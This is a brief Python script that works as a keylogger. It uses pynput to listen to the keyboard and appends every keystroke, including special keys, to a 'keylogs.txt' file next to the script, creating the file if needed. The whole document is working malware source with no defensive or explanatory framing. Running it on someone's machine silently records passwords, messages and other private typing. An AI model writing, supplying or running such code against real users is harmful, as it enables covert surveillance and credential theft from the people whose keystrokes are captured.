import os
from pynput import keyboard

# Get the directory of the current script
script_dir = os.path.dirname(os.path.abspath(__file__))
log_file_path = os.path.join(script_dir, 'keylogs.txt')

def on_press(key):
    try:
        with open(log_file_path, 'a') as f:
            if hasattr(key, 'char'):  # Alphanumeric key
                f.write(key.char)
            else:  # Special key
                f.write(f'[{key}]')
    except Exception as e:
        print(f"Error logging keystroke: {e}")

def on_release(key):
    pass

# Create the log file if it doesn't exist
if not os.path.exists(log_file_path):
    with open(log_file_path, 'w') as f:
        pass

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()